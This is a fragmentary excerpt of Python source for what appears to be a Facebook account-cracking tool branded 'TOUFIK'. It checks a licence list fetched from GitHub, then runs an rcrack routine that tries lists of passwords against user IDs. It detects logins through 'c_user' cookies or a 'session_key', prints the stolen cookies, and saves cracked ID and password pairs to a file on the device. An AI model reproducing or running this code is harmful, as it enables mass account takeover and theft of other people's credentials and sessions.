...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get('https://raw.githubusercontent.com/testourx/T-X/main/Checker.txt').text
...
""")
  ...
  print ("")
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/testourx/T-X/main/Checker.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open https://www.facebook.com/toufik.hossain.17x?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
├─\033[38;5;196m[\x1b[38;5;46m=\033[38;5;196m]\x1b[38;5;46m FACEBOOK  \033[38;5;196m:\x1b[38;5;46m TOUFIK　 ツ                 │
├─\033[38;5;196m[\x1b[38;5;46m=\033[38;5;196m]\x1b[38;5;46m GITHUB   \033[38;5;196m :\x1b[38;5;46m TOUF\033[38;5;196m-\x1b[38;5;46m1-K                       │
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\r\033[1;32m[TOUFIK-OK💚] \033[1;32m'+cid+'\033[1;32m • \033[1;32m' +ps+    '  \n[] \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('/sdcard/TOUFIK-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid = coki[24:39]
                if 'y' in madhi_cp:
                    print('\r\r\33[1;30m[TOUFIK-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
        ...
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uidX not in oks:
                    ...
                    print(f'{G}PASS   : {W}{pw}')
                    open('/sdcard/TOUFIK-OK.txt', 'a').write(uidX+'|'+pw+'\n')
                    if 'y' in mahdi_coki:
                ...
                if uid not in cps:
                    if 'y' in madhi_cp:
                        print(f'\r{R}[TOUFIK-CP] {uid}  | {pw} {W}')
